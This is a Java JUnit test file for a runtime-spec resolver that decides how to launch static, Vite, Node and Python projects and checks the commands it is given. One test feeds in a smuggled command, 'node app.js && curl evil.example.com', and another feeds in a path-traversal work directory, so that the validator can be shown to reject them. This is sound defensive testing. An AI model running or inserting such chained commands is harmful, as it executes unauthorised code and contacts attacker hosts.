package com.dbts.glyahhaigeneratecode.runtime;

import com.dbts.glyahhaigeneratecode.config.RuntimeProperties;
import com.dbts.glyahhaigeneratecode.exception.MyException;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * 运行规格推断与校验。
 *
 * <p>校验那几条是安全边界：项目里的文件内容不可信，命令与工作目录必须落在允许范围内
 * 才能执行 —— 不校验就等于把工作区里的任意字符串当命令跑。
 */
@DisplayName("运行规格推断")
class RuntimeSpecResolverTest {

    @TempDir
    Path workspace;

    private final RuntimeSpecResolver resolver = new RuntimeSpecResolver(new RuntimeProperties());

    @Test
    @DisplayName("只有 index.html：按静态站点起一个常驻进程")
    void staticSiteGetsServerProcess() throws IOException {
        write("index.html", "<html><body>hi</body></html>");

        RuntimeSpec spec = resolver.resolve(workspace);

        assertEquals(RuntimeSpec.RuntimeKind.STATIC, spec.getKind());
        assertEquals("", spec.getProcesses().get(0).getWorkDir());
        assertEquals(1, spec.getProcesses().size());
        assertNotNull(spec.getPrimaryPort());
        // 静态站点同样要能「运行」，所以必须真的有进程，不能是空列表
        assertTrue(spec.getProcesses().get(0).getCommand().contains("http.server"));
    }

    @Test
    @DisplayName("Vite 工程有 dist 时按静态产物跑，不再起 dev server")
    void viteWithDistRunsAsStatic() throws IOException {
        write("package.json", "{\"name\":\"x\",\"dependencies\":{\"vue\":\"^3\"}}");
        write("vite.config.js", "export default {}");
        write("index.html", "<div id=\"app\"></div>");
        write("dist/index.html", "<div id=\"app\"></div>");

        RuntimeSpec spec = resolver.resolve(workspace);

        assertEquals(RuntimeSpec.RuntimeKind.STATIC, spec.getKind());
        assertEquals("dist", spec.getProcesses().get(0).getWorkDir());
    }

    @Test
    @DisplayName("Vite 工程没构建时起 dev server，并标记需要先装依赖")
    void viteWithoutDistRunsDevServer() throws IOException {
        write("package.json", "{\"name\":\"x\",\"dependencies\":{\"vue\":\"^3\"}}");
        write("vite.config.js", "export default {}");
        write("index.html", "<div id=\"app\"></div>");

        RuntimeSpec spec = resolver.resolve(workspace);

        assertEquals(RuntimeSpec.RuntimeKind.NODE, spec.getKind());
        assertTrue(spec.getProcesses().get(0).getCommand().contains("npm run dev"));
        assertEquals("npm install", spec.getBuildCommand());
    }

    @Test
    @DisplayName("Node 工程有 start 脚本时优先用它")
    void nodePrefersStartScript() throws IOException {
        write("package.json", "{\"name\":\"x\",\"scripts\":{\"start\":\"node server.js\"}}");
        write("server.js", "console.log(1)");

        RuntimeSpec spec = resolver.resolve(workspace);

        assertEquals(RuntimeSpec.RuntimeKind.NODE, spec.getKind());
        assertEquals("npm start", spec.getProcesses().get(0).getCommand());
        // 没有 dependencies 就不该跑 npm install 白等
        assertNull(spec.getBuildCommand());
    }

    @Test
    @DisplayName("Python 工程只在有依赖清单时才装依赖")
    void pythonInstallsOnlyWhenRequirementsExist() throws IOException {
        write("main.py", "print('hi')");

        RuntimeSpec without = resolver.resolve(workspace);
        assertEquals(RuntimeSpec.RuntimeKind.PYTHON, without.getKind());
        assertNull(without.getBuildCommand());

        write("requirements.txt", "flask==3.0.0");
        RuntimeSpec with = resolver.resolve(workspace);
        assertEquals("pip3 install -r requirements.txt", with.getBuildCommand());
    }

    @Test
    @DisplayName("声明的 run.json 覆盖推断结果")
    void declaredSpecWins() throws IOException {
        write("index.html", "<html></html>");
        write(".glyahh/run.json", """
                {
                  "kind": "NODE",
                  "primaryPort": 4000,
                  "processes": [
                    {"name": "web", "command": "node custom.js", "port": 4000, "readiness": "PORT"}
                  ]
                }
                """);

        RuntimeSpec spec = resolver.resolve(workspace);

        assertEquals(RuntimeSpec.RuntimeKind.NODE, spec.getKind());
        assertEquals("node custom.js", spec.getProcesses().get(0).getCommand());
        assertTrue(spec.getSource().startsWith("declared:"));
    }

    @Test
    @DisplayName("认不出来的项目明确说不支持，而不是猜一个命令")
    void unsupportedIsExplicit() throws IOException {
        write("notes.md", "just a doc");

        // resolve 直接抛：用户点「运行」时应立刻拿到「不支持」的明确原因，
        // 而不是一个跑不起来的规格
        MyException error = assertThrows(MyException.class, () -> resolver.resolve(workspace));
        assertTrue(error.getMessage().contains("无法识别"), "错误信息要说明为什么不支持");
    }

    @Test
    @DisplayName("Vite 工程用 dist 跑时同样有常驻进程")
    void viteWithDistStillHasProcess() throws IOException {
        write("package.json", "{\"name\":\"x\"}");
        write("vite.config.js", "export default {}");
        write("index.html", "<div id=\"app\"></div>");
        write("dist/index.html", "<div id=\"app\"></div>");

        RuntimeSpec spec = resolver.resolve(workspace);

        // 空进程列表会让 runner 脚本没有可等的子进程而直接退出
        assertFalse(spec.getProcesses().isEmpty(), "静态站点也必须有受管进程");
    }

    @Test
    @DisplayName("校验拦住能拼出注入的命令")
    void validateRejectsShellMetacharacters() {
        RuntimeSpec spec = RuntimeSpec.builder()
                .kind(RuntimeSpec.RuntimeKind.NODE)
                .processes(List.of(RuntimeSpec.ManagedProcess.builder()
                        .name("web")
                        .command("node app.js && curl evil.example.com")
                        .port(3000)
                        .build()))
                .primaryPort(3000)
                .build();

        assertThrows(MyException.class, () -> resolver.validate(spec, workspace));
    }

    @Test
    @DisplayName("校验拦住越界的工作目录")
    void validateRejectsEscapingWorkDir() {
        RuntimeSpec spec = RuntimeSpec.builder()
                .kind(RuntimeSpec.RuntimeKind.NODE)
                .processes(List.of(RuntimeSpec.ManagedProcess.builder()
                        .name("web")
                        .command("node app.js")
                        .workDir("../../elsewhere")
                        .port(3000)
                        .build()))
                .primaryPort(3000)
                .build();

        assertThrows(MyException.class, () -> resolver.validate(spec, workspace));
    }

    @Test
    @DisplayName("校验拦住不在受管进程里的入口端口")
    void validateRejectsForeignPrimaryPort() {
        RuntimeSpec spec = RuntimeSpec.builder()
                .kind(RuntimeSpec.RuntimeKind.NODE)
                .processes(List.of(RuntimeSpec.ManagedProcess.builder()
                        .name("web")
                        .command("node app.js")
                        .port(3000)
                        .build()))
                .primaryPort(9999)
                .build();

        assertThrows(MyException.class, () -> resolver.validate(spec, workspace));
    }

    private void write(String relative, String content) throws IOException {
        Path target = workspace.resolve(relative);
        Files.createDirectories(target.getParent());
        Files.writeString(target, content);
    }
}
